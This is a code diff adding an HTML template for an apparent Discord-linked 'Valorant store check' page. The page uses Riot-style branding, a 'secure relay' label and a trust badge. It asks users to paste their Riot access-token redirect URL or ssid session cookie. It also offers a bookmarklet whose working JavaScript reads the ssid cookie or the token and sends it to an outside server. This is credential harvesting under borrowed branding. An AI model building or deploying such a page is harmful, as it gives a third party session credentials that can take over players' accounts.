@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="{{INITIAL_LANG}}">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{PAGE_TITLE}}</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #080c10;
+            --bg-card: rgba(18, 26, 36, 0.88);
+            --bg-card-border: rgba(255, 255, 255, 0.1);
+            --val-red: #ff4655;
+            --val-red-hover: #fa3444;
+            --val-red-glow: rgba(255, 70, 85, 0.35);
+            --val-white: #ece8e1;
+            --val-gray: #8b99a8;
+            --val-dark: #0f1923;
+            --val-success: #00eb9c;
+            --val-success-bg: rgba(0, 235, 156, 0.12);
+            --font-tactical: 'Rajdhani', -apple-system, sans-serif;
+            --font-body: 'Inter', -apple-system, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(255, 70, 85, 0.12) 0%, transparent 60%),
+                radial-gradient(circle at 100% 100%, rgba(0, 235, 156, 0.04) 0%, transparent 40%),
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 100% 100%, 100% 100%, 32px 32px, 32px 32px;
+            color: var(--val-white);
+            font-family: var(--font-body);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Ambient tactical HUD elements in corners */
+        .hud-corner-tl, .hud-corner-br {
+            position: fixed;
+            font-family: var(--font-tactical);
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            pointer-events: none;
+            display: none;
+        }
+        @media (min-width: 768px) {
+            .hud-corner-tl { display: block; top: 24px; left: 32px; }
+            .hud-corner-br { display: block; bottom: 24px; right: 32px; }
+        }
+
+        .portal-card {
+            width: 100%;
+            max-width: 540px;
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 14px;
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(255, 70, 85, 0.06);
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Top red tactical accent */
+        .accent-bar {
+            height: 4px;
+            background: linear-gradient(90deg, var(--val-red) 0%, #ff8b94 50%, var(--val-red) 100%);
+            box-shadow: 0 0 12px var(--val-red-glow);
+        }
+
+        .card-body {
+            padding: 32px 28px;
+        }
+
+        @media (max-width: 480px) {
+            .card-body { padding: 24px 18px; }
+        }
+
+        /* Top Header */
+        .header-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            gap: 12px;
+        }
+
+        .brand-cluster {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .val-logo-box {
+            width: 42px;
+            height: 42px;
+            background: rgba(255, 70, 85, 0.12);
+            border: 1px solid rgba(255, 70, 85, 0.3);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .val-logo-box:hover {
+            border-color: var(--val-red);
+            box-shadow: 0 0 16px var(--val-red-glow);
+        }
+
+        .brand-text h1 {
+            font-family: var(--font-tactical);
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            line-height: 1.1;
+            color: #fff;
+        }
+
+        .brand-text .subtext {
+            font-size: 10px;
+            font-family: var(--font-tactical);
+            color: var(--val-red);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        /* Language Selector Pill */
+        .lang-picker select {
+            background: rgba(15, 25, 35, 0.85);
+            color: var(--val-white);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 6px;
+            padding: 6px 10px;
+            font-size: 12px;
+            font-weight: 600;
+            font-family: var(--font-body);
+            outline: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .lang-picker select:hover, .lang-picker select:focus {
+            border-color: var(--val-red);
+            background: rgba(25, 38, 52, 0.95);
+        }
+
+        /* Security Trust Seal */
+        .security-badge {
+            background: rgba(0, 235, 156, 0.06);
+            border: 1px solid rgba(0, 235, 156, 0.2);
+            border-radius: 6px;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            font-size: 11px;
+            color: #a4ecd2;
+            line-height: 1.4;
+        }
+
+        .security-badge .shield-icon {
+            font-size: 14px;
+            color: var(--val-success);
+            flex-shrink: 0;
+        }
+
+        /* User Identity Card */
+        .user-panel {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(11, 18, 26, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            padding: 12px 14px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .avatar-wrap {
+            position: relative;
+        }
+
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #2b3b4c, #1a2430);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-tactical);
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .status-dot {
+            position: absolute;
+            bottom: -1px;
+            right: -1px;
+            width: 10px;
+            height: 10px;
+            background: var(--val-success);
+            border: 2px solid var(--bg-deep);
+            border-radius: 50%;
+        }
+
+        .user-meta .user-tag {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .user-meta .user-id-hint {
+            font-size: 11px;
+            color: var(--val-gray);
+            font-family: var(--font-tactical);
+            letter-spacing: 0.5px;
+        }
+
+        /* Tactical Step Cards */
+        .step-block {
+            background: rgba(14, 22, 31, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .step-tag {
+            font-family: var(--font-tactical);
+            background: var(--val-red);
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 4px;
+            letter-spacing: 1px;
+        }
+
+        .step-heading {
+            font-family: var(--font-tactical);
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: #fff;
+        }
+
+        .step-description {
+            font-size: 13px;
+            color: var(--val-gray);
+            line-height: 1.5;
+            margin-bottom: 14px;
+        }
+
+        /* Buttons */
+        .btn-primary-riot {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 13px 20px;
+            background: #d13639;
+            background-image: linear-gradient(180deg, #ea323c 0%, #cb2630 100%);
+            color: #fff;
+            font-family: var(--font-tactical);
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-decoration: none;
+            border-radius: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 16px rgba(209, 54, 57, 0.3);
+        }
+
+        .btn-primary-riot:hover {
+            background: #eb3f48;
+            box-shadow: 0 6px 24px rgba(209, 54, 57, 0.45);
+            transform: translateY(-1px);
+        }
+
+        .btn-hint {
+            text-align: center;
+            font-size: 11px;
+            color: var(--val-gray);
+            margin-top: 8px;
+        }
+
+        /* Method Tabs */
+        .method-tabs {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 14px;
+            background: rgba(0, 0, 0, 0.25);
+            padding: 4px;
+            border-radius: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 8px 10px;
+            font-family: var(--font-tactical);
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            background: transparent;
+            color: var(--val-gray);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+
+        .tab-btn.active {
+            background: rgba(255, 255, 255, 0.08);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Address Bar Mockup */
+        .address-mockup {
+            background: rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            padding: 10px 12px;
+            margin-bottom: 12px;
+        }
+
+        .mockup-label {
+            font-size: 11px;
+            font-family: var(--font-tactical);
+            color: var(--val-gray);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .mockup-url-bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(15, 25, 35, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 6px 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #00eb9c;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .mockup-url-bar .lock {
+            color: var(--val-success);
+            font-size: 12px;
+        }
+
+        .mockup-tip {
+            font-size: 11px;
+            color: var(--val-gray);
+            margin-top: 6px;
+            line-height: 1.4;
+        }
+
+        /* Textarea / Input */
+        .token-textarea {
+            width: 100%;
+            background: rgba(10, 16, 22, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 6px;
+            padding: 12px;
+            color: #fff;
+            font-size: 12px;
+            font-family: monospace;
+            resize: vertical;
+            min-height: 64px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .token-textarea:focus {
+            border-color: var(--val-red);
+            box-shadow: 0 0 12px rgba(255, 70, 85, 0.2);
+        }
+
+        .token-feedback {
+            display: none;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--val-success);
+            margin-top: 6px;
+            padding: 4px 8px;
+            background: var(--val-success-bg);
+            border-radius: 4px;
+            animation: fadeIn 0.2s;
+        }
+
+        /* Action Submit Button */
+        .btn-submit-action {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            margin-top: 14px;
+            padding: 14px 20px;
+            background: var(--val-red);
+            color: #fff;
+            font-family: var(--font-tactical);
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 20px rgba(255, 70, 85, 0.35);
+        }
+
+        .btn-submit-action:hover:not(:disabled) {
+            background: var(--val-red-hover);
+            box-shadow: 0 6px 28px rgba(255, 70, 85, 0.5);
+            transform: translateY(-1px);
+        }
+
+        .btn-submit-action:disabled {
+            opacity: 0.55;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        /* Bookmarklet Tool Tab Area */
+        .bookmarklet-tab-content {
+            display: none;
+            text-align: center;
+            padding: 16px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px dashed rgba(255, 255, 255, 0.12);
+            border-radius: 8px;
+        }
+
+        .bookmarklet-btn-styled {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #253342;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-family: var(--font-tactical);
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-decoration: none;
+            cursor: grab;
+            margin: 10px 0;
+            transition: all 0.2s;
+        }
+
+        .bookmarklet-btn-styled:hover {
+            background: #34475c;
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Status & Feedback Messages */
+        .status-badge-msg {
+            display: none;
+            margin-top: 14px;
+            padding: 12px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .status-badge-loading {
+            display: block;
+            background: rgba(43, 62, 82, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #c4d4e4;
+        }
+
+        .status-badge-error {
+            display: block;
+            background: rgba(255, 70, 85, 0.12);
+            border: 1px solid var(--val-red);
+            color: #ff9da5;
+        }
+
+        /* Verified Success Screen */
+        .success-panel {
+            display: none;
+            text-align: center;
+            padding: 24px 12px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .success-icon-ring {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: rgba(0, 235, 156, 0.12);
+            border: 2px solid var(--val-success);
+            color: var(--val-success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            margin: 0 auto 18px;
+            box-shadow: 0 0 30px rgba(0, 235, 156, 0.25);
+        }
+
+        .success-heading {
+            font-family: var(--font-tactical);
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            color: var(--val-success);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+
+        .operative-card {
+            display: inline-block;
+            background: rgba(14, 22, 31, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            padding: 10px 24px;
+            margin: 16px 0 20px;
+        }
+
+        .operative-name {
+            font-family: var(--font-tactical);
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+
+        .operative-tag {
+            font-size: 10px;
+            font-family: var(--font-tactical);
+            color: var(--val-success);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .footer-note {
+            text-align: center;
+            font-size: 11px;
+            font-family: var(--font-tactical);
+            letter-spacing: 1px;
+            color: rgba(255, 255, 255, 0.25);
+            margin-top: 18px;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+    <div class="hud-corner-tl">// SECURE_RSO_GATEWAY &bull; STATUS: ACTIVE</div>
+    <div class="hud-corner-br">[ VALORANT STORE CHECK &bull; AUTH V2.4 ]</div>
+
+    <div class="portal-card">
+        <div class="accent-bar"></div>
+        <div class="card-body">
+            <!-- Header Row -->
+            <div class="header-row">
+                <div class="brand-cluster">
+                    <div class="val-logo-box" aria-hidden="true">
+                        <svg viewBox="0 0 100 80" width="26" height="21" fill="none">
+                            <path d="M0 0h19.5l30.5 50.5L30.5 80 0 0z" fill="#ff4655"/>
+                            <path d="M50 80h19.5L100 0H80.5L50 80z" fill="#ece8e1"/>
+                        </svg>
+                    </div>
+                    <div class="brand-text">
+                        <h1 data-i18n="brandTitle">{{BRAND_TITLE}}</h1>
+                        <div class="subtext" data-i18n="brandSubtitle">{{BRAND_SUBTITLE}}</div>
+                    </div>
+                </div>
+                <div class="lang-picker">
+                    <select id="lang-select" onchange="setLanguage(this.value)" aria-label="Language Selector">
+                        {{LANG_OPTIONS}}
+                    </select>
+                </div>
+            </div>
+
+            <!-- Security Trust Seal -->
+            <div class="security-badge">
+                <span class="shield-icon">🛡️</span>
+                <span data-i18n="securityBadge">{{SECURITY_BADGE}}</span>
+            </div>
+
+            <!-- Discord User Profile Confirmation -->
+            <div class="user-panel">
+                <div class="avatar-wrap">
+                    <div class="user-avatar">{{USER_AVATAR}}</div>
+                    <div class="status-dot"></div>
+                </div>
+                <div class="user-meta">
+                    <div class="user-tag">{{USER_NAME}}</div>
+                    <div id="user-hint-text" class="user-id-hint">{{USER_HINT}}</div>
+                </div>
+            </div>
+
+            <!-- Main Auth Flow Area -->
+            <div id="login-flow">
+                <!-- Step 1 -->
+                <div class="step-block">
+                    <div class="step-header">
+                        <span class="step-tag" data-i18n="step1Num">{{STEP1_NUM}}</span>
+                        <span class="step-heading" data-i18n="step1Title">{{STEP1_TITLE}}</span>
+                    </div>
+                    <p class="step-description" data-i18n="step1Desc">{{STEP1_DESC}}</p>
+                    <a href="{{RIOT_AUTH_URL}}" target="_blank" rel="noopener noreferrer" class="btn-primary-riot">
+                        <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-6h2v6zm4 0h-2V7h2v10z"/>
+                        </svg>
+                        <span data-i18n="step1Btn">{{STEP1_BTN}}</span>
+                        <span>↗</span>
+                    </a>
+                    <div class="btn-hint" data-i18n="step1Hint">{{STEP1_HINT}}</div>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="step-block">
+                    <div class="step-header">
+                        <span class="step-tag" data-i18n="step2Num">{{STEP2_NUM}}</span>
+                        <span class="step-heading" data-i18n="step2Title">{{STEP2_TITLE}}</span>
+                    </div>
+
+                    <p class="step-description" data-i18n-html="step2Notice">
+                        {{STEP2_NOTICE}}
+                    </p>
+
+                    <!-- Method Selection Tabs -->
+                    <div class="method-tabs">
+                        <button type="button" id="tab-url-btn" class="tab-btn active" data-i18n="tabUrl">{{TAB_URL}}</button>
+                        <button type="button" id="tab-bm-btn" class="tab-btn" data-i18n="tabBookmarklet">{{TAB_BOOKMARKLET}}</button>
+                    </div>
+
+                    <!-- Method A: Paste URL / Token (Universal) -->
+                    <div id="method-url-pane">
+                        <div class="address-mockup">
+                            <div class="mockup-label" data-i18n="addressBarMockupLabel">{{ADDRESS_BAR_MOCKUP_LABEL}}</div>
+                            <div class="mockup-url-bar">
+                                <span class="lock">🔒</span>
+                                <span data-i18n="addressBarMockupText">{{ADDRESS_BAR_MOCKUP_TEXT}}</span>
+                            </div>
+                            <div class="mockup-tip" data-i18n="addressBarMockupTip">{{ADDRESS_BAR_MOCKUP_TIP}}</div>
+                        </div>
+
+                        <div style="margin-top: 10px;">
+                            <label for="cookie-input" style="display: block; font-size: 11px; font-weight: 600; color: var(--val-gray); margin-bottom: 6px;" data-i18n="inputLabel">
+                                {{INPUT_LABEL}}
+                            </label>
+                            <textarea id="cookie-input" class="token-textarea" placeholder="{{INPUT_PLACEHOLDER}}"></textarea>
+                            <div id="token-detected-badge" class="token-feedback"></div>
+                        </div>
+
+                        <button type="button" id="submit-btn" class="btn-submit-action">
+                            <span data-i18n="submitBtn">{{SUBMIT_BTN}}</span>
+                        </button>
+                    </div>
+
+                    <!-- Method B: 1-Click Bookmarklet Tool (Desktop) -->
+                    <div id="method-bm-pane" class="bookmarklet-tab-content">
+                        <p style="font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 4px;" data-i18n="bookmarkletTitle">
+                            {{BOOKMARKLET_TITLE}}
+                        </p>
+                        <p style="font-size: 11px; color: var(--val-gray); line-height: 1.4;" data-i18n="bookmarkletHint">
+                            {{BOOKMARKLET_HINT}}
+                        </p>
+                        <a id="bookmarklet-link" href="{{BOOKMARKLET_SCRIPT}}" class="bookmarklet-btn-styled">
+                            <span data-i18n="bookmarkletBtn">{{BOOKMARKLET_BTN}}</span>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="status-box" class="status-badge-msg"></div>
+            </div>
+
+            <!-- Success Area -->
+            <div id="success-flow" class="success-panel">
+                <div class="success-icon-ring">✓</div>
+                <div class="success-heading" data-i18n="successTitle">{{SUCCESS_TITLE}}</div>
+                <p style="font-size: 13px; color: var(--val-gray);" data-i18n="successSubtitle">{{SUCCESS_SUBTITLE}}</p>
+                <div class="operative-card">
+                    <div id="riot-username" class="operative-name">Loading...</div>
+                    <div class="operative-tag" data-i18n="successTag">{{SUCCESS_TAG}}</div>
+                </div>
+                <p data-i18n-html="successHint" style="font-size: 13px; color: #a4b3c2; line-height: 1.6;">
+                    {{SUCCESS_HINT}}
+                </p>
+            </div>
+
+            <div class="footer-note">RIOT GAMES VALORANT &bull; RSO SECURE RELAY</div>
+        </div>
+    </div>
+
+    <script id="translations-data" type="application/json">
+{{TRANSLATIONS_JSON}}
+    </script>
+    <script>
+        const translations = JSON.parse(document.getElementById("translations-data").textContent);
+        const publicUrl = "{{PUBLIC_URL}}";
+        const sessionToken = "{{SESSION_TOKEN}}";
+        const sessionUserId = "{{SESSION_USER_ID}}";
+        const defaultPortalLang = "en";
+
+        const cookieInput = document.getElementById("cookie-input");
+        const submitBtn = document.getElementById("submit-btn");
+        const statusBox = document.getElementById("status-box");
+        const loginFlow = document.getElementById("login-flow");
+        const successFlow = document.getElementById("success-flow");
+        const riotUsernameEl = document.getElementById("riot-username");
+        const langSelect = document.getElementById("lang-select");
+        const bookmarkletLink = document.getElementById("bookmarklet-link");
+        const tokenBadge = document.getElementById("token-detected-badge");
+
+        // Tab Switching
+        const tabUrlBtn = document.getElementById("tab-url-btn");
+        const tabBmBtn = document.getElementById("tab-bm-btn");
+        const methodUrlPane = document.getElementById("method-url-pane");
+        const methodBmPane = document.getElementById("method-bm-pane");
+
+        tabUrlBtn.addEventListener("click", () => {
+            tabUrlBtn.classList.add("active");
+            tabBmBtn.classList.remove("active");
+            methodUrlPane.style.display = "block";
+            methodBmPane.style.display = "none";
+        });
+
+        tabBmBtn.addEventListener("click", () => {
+            tabBmBtn.classList.add("active");
+            tabUrlBtn.classList.remove("active");
+            methodUrlPane.style.display = "none";
+            methodBmPane.style.display = "block";
+        });
+
+        // Determine active language
+        const urlParams = new URLSearchParams(window.location.search);
+        const queryLang = urlParams.get("lang");
+        const savedLang = localStorage.getItem("val_store_lang");
+        const browserLang = (navigator.language || "").split("-")[0];
+
+        let currentLang = "{{INITIAL_LANG}}" || defaultPortalLang;
+        if (queryLang && translations[queryLang]) {
+            currentLang = queryLang;
+        } else if (savedLang && translations[savedLang]) {
+            currentLang = savedLang;
+        } else if (!queryLang && browserLang && translations[browserLang]) {
+            currentLang = browserLang;
+        }
+
+        // Apply initial language
+        setLanguage(currentLang);
+
+        langSelect.addEventListener("change", (e) => {
+            setLanguage(e.target.value);
+        });
+
+        function setLanguage(lang) {
+            if (!translations[lang]) lang = defaultPortalLang;
+            currentLang = lang;
+            const t = translations[lang];
+
+            document.documentElement.lang = lang;
+            document.title = t.pageTitle;
+
+            document.querySelectorAll("[data-i18n]").forEach(el => {
+                const key = el.getAttribute("data-i18n");
+                if (t[key]) el.textContent = t[key];
+            });
+
+            document.querySelectorAll("[data-i18n-html]").forEach(el => {
+                const key = el.getAttribute("data-i18n-html");
+                if (t[key]) el.innerHTML = t[key];
+            });
+
+            if (cookieInput) {
+                cookieInput.placeholder = t.inputPlaceholder;
+            }
+
+            const userHintEl = document.getElementById("user-hint-text");
+            if (userHintEl && sessionUserId) {
+                userHintEl.textContent = t.connectingTo + " " + sessionUserId;
+            }
+
+            if (bookmarkletLink) {
+                bookmarkletLink.href = getBookmarkletScript(lang);
+            }
+
+            if (langSelect && langSelect.value !== lang) {
+                langSelect.value = lang;
+            }
+
+            // Check input for real-time validation feedback
+            checkInputContent();
+
+            try {
+                localStorage.setItem("val_store_lang", lang);
+            } catch (e) {}
+        }
+
+        function getBookmarkletScript(lang) {
+            const t = translations[lang] || translations[defaultPortalLang];
+            const alertNotRiot = (t.bookmarkletAlertNotRiot || "").replace(/\\/g, "\\\\").replace(/'/g, "\\'");
+            const alertNoToken = (t.bookmarkletAlertNoToken || "").replace(/\\/g, "\\\\").replace(/'/g, "\\'");
+            const alertErr = (t.bookmarkletAlertError || "").replace(/\\/g, "\\\\").replace(/'/g, "\\'");
+
+            return "javascript:(function(){try{var href=window.location.href;if(href.indexOf('access_token=')!==-1){window.location.href='" + publicUrl + "/auth/login?token=" + sessionToken + "&lang=" + lang + "&redirect_url='+encodeURIComponent(href);return;}var c=document.cookie.match(/(?:^|;\\s*)ssid=([^;]*)/);if(c&&c[1]){window.location.href='" + publicUrl + "/auth/login?token=" + sessionToken + "&lang=" + lang + "&ssid='+encodeURIComponent(c[1]);return;}if(href.indexOf('/auth/login')!==-1||href.indexOf('localhost')!==-1){alert('" + alertNotRiot + "');}else{alert('" + alertNoToken + "');}}catch(e){alert('" + alertErr + "'+e.message);}})();";
+        }
+
+        // Live input detection
+        cookieInput.addEventListener("input", checkInputContent);
+
+        function checkInputContent() {
+            const val = cookieInput.value.trim();
+            const t = translations[currentLang] || translations[defaultPortalLang];
+            if (!val) {
+                tokenBadge.style.display = "none";
+                return;
+            }
+            if (val.includes("access_token=") || val.startsWith("http://") || val.startsWith("https://")) {
+                tokenBadge.textContent = t.tokenDetectedSuccess;
+                tokenBadge.style.display = "flex";
+            } else if (val.includes("ssid=") || val.length >= 40) {
+                tokenBadge.textContent = t.tokenDetectedSsid;
+                tokenBadge.style.display = "flex";
+            } else {
+                tokenBadge.style.display = "none";
+            }
+        }
+
+        // Auto-check redirect_url or ssid parameter in query (auto-filled via Bookmarklet)
+        const autoRedirectUrl = urlParams.get("redirect_url");
+        const autoSsid = urlParams.get("ssid");
+        if (autoRedirectUrl) {
+            cookieInput.value = autoRedirectUrl;
+            checkInputContent();
+            submitSession(autoRedirectUrl);
+        } else if (autoSsid) {
+            cookieInput.value = autoSsid;
+            checkInputContent();
+            submitSession(autoSsid);
+        }
+
+        submitBtn.addEventListener("click", () => {
+            const val = cookieInput.value.trim();
+            const t = translations[currentLang] || translations[defaultPortalLang];
+            if (!val) {
+                showError(t.emptyInputError);
+                return;
+            }
+            submitSession(val);
+        });
+
+        async function submitSession(rawCookie) {
+            const t = translations[currentLang] || translations[defaultPortalLang];
+            submitBtn.disabled = true;
+            showLoading(t.verifyingStatus);
+
+            try {
+                const res = await fetch("/api/auth/submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ token: sessionToken, cookies: rawCookie, lang: currentLang })
+                });
+
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    showSuccess(data.username);
+                } else {
+                    submitBtn.disabled = false;
+                    showError(data.error || t.failStatus);
+                }
+            } catch (err) {
+                submitBtn.disabled = false;
+                showError(t.networkError + err.message);
+            }
+        }
+
+        function showLoading(msg) {
+            statusBox.className = "status-badge-msg status-badge-loading";
+            statusBox.textContent = msg;
+        }
+
+        function showError(msg) {
+            statusBox.className = "status-badge-msg status-badge-error";
+            statusBox.textContent = msg;
+        }
+
+        function showSuccess(username) {
+            loginFlow.style.display = "none";
+            statusBox.style.display = "none";
+            successFlow.style.display = "block";
+            riotUsernameEl.textContent = username || "VALORANT OPERATIVE";
+        }
+    </script>
+</body>
+</html>
